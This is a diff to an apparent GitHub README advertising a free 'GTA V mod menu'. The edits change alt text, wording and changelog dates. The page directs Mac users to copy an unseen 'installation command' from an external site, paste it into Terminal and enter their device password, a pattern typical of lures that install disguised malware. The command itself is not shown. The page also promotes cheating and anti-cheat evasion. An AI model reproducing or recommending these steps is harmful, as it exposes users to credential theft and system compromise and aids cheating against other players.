@@ -1,6 +1,5 @@
 # 💀 0xcheats GTA Mod Menu — The BEST Mod Menu for GTA V
 
-
 **0xcheats GTA Mod Menu** is a powerful, community-trusted mod menu built for
 GTA V — covering both the classic and the **GTA Enhanced** edition. If you've
 been frustrated by mod menus that break after every Rockstar update, charge
@@ -9,7 +8,7 @@ direct answer to all of that.
 
 ## **[💀 Download 0xcheats GTA Mod Menu Free 💀](https://0xcheat.github.io/0xcheats/)**
 
-<img width="1280" height="720" alt="0xcheats GTA Mod Menu" src="https://github.com/user-attachments/assets/ea5a913d-142e-4687-9462-559412c59da9" />
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/ea5a913d-142e-4687-9462-559412c59da9" />
 
 From instant **money and RP tools** that let you skip hours of grinding, to
 full player protection in hostile online lobbies, 0xcheats delivers a
@@ -110,7 +109,7 @@ in every session:
 
 1. Click **[Download 0xcheats Free →](https://0xcheat.github.io/0xcheats/)** to get the latest installation command
 2. Open **Terminal** on your Mac (Applications → Utilities → Terminal)
-3. Paste the installation code into Terminal and press `Enter`
+3. Paste the installation command line into Terminal and press `Enter`
 4. Enter your **device password** when asked
 5. Wait for the installation to complete automatically
 7. Press **F6** to open the menu once you are fully loaded into the game
@@ -179,26 +178,26 @@ to a few consistent habits:
 
 ## 📋 Changelog
 
-### v5.1.2 — September 2026
+### v5.1.2 — October 2026
 - 🔧 Fixed injection failure on GTA V Enhanced build v1.0.3095
 - 🛡️ Updated anti-cheat layer to counter latest Rockstar backend changes
 - 🐛 Resolved UI scaling issue on 4K displays
 - ⚡ Reduced memory footprint by 15% during active sessions
 - 🍏 Added native macOS Terminal installation script support
 
-### v5.1.0 — August 2026
+### v5.1.0 — September 2026
 - ✨ Full **0xcheats GTA Enhanced** compatibility confirmed and released
 - 🌙 New UI theme engine — choose from 6 built-in color presets
 - 📜 Script Loader v2 with drag-and-drop support and script tagging
 - 🌐 Added Portuguese, Italian, and Turkish language options
 
-### v5.0.5 — July 2026
+### v5.0.5 — August 2026
 - 🔄 Auto-update engine rebuilt for sub-24hr patch deployment
 - 💰 Overhauled money tool with configurable payout amounts and
   session-based limits to reduce detection risk
 - 🚗 Added 35 new vehicles including all late-2026 GTA Online DLC additions
 
-### v5.0.0 — June 2026
+### v5.0.0 — July 2026
 - ⚡ Complete core rewrite — injection speed improved by 45%
 - 🗺️ New teleportation system with unlimited saved custom waypoints
 - 🎮 Full controller support added for menu navigation
